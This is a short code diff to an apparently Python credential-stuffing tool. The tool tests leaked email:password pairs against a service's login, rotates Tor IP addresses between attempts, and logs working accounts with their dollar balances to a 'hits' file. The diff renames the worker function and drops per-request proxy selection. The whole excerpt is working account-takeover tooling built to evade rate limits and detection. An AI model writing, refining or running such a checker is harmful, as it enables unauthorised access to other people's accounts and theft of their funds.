@@ -62,11 +62,10 @@ def successResult(cred, credits, cents):
     save = open("hits.txt", "a").write(f"[+] GOOD : {cred} | Balance : {credits} in USD: {int(cents)/100}$ \n")
 
 
-def handle_login_and_balance(cred):
+def task(cred):
     email = cred.split(":")[0]
     password = cred.split(":")[1]
-    proxy = random.choice(proxies) 
-    login, key = checklogin(email, password, proxy)
+    login, key = checklogin(email, password)
     
     if login:
         balance = getAccountInfo(key)
@@ -87,6 +86,6 @@ def main():
             for line in file:
                 renew_tor_ip()
                 cred = line.strip()
-                executor.submit(handle_login_and_balance, cred) 
+                executor.submit(task, cred) 
         
 main()
